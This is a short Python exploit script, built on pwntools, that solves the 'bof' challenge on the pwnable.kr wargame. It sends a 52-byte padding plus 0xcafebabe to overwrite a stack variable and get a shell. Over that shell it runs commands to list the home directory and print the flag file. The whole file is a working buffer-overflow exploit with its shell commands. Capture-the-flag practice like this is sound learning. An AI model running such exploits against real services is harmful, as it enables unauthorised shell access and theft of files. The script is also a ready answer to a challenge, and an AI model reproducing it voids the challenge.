
#!/usr/bin/env python3
from pwn import *

context.clear(arch="i386", os="linux")

HOST = "pwnable.kr"
PORT = 10003

OFFSET = 52
payload = b"A" * OFFSET + p32(0xcafebabe)

io = remote(HOST, PORT) if args.REMOTE else process("./bof")

if args.REMOTE:
    io.sendlineafter(b"overflow me : ", payload)

    io.recvuntil(b"$ ", timeout=5)

    io.sendline(
        b"pwd; id; ls -la /home/bof_pwn; "
        b"cat /home/bof_pwn/flag; echo __END__"
    )

    try:
        result = io.recvuntil(b"__END__", timeout=5)
        print(result.decode(errors="replace"))
    except EOFError:
        log.failure("Remote shell closed connection")

else:
    io.sendline(payload)
    io.interactive()

io.close()
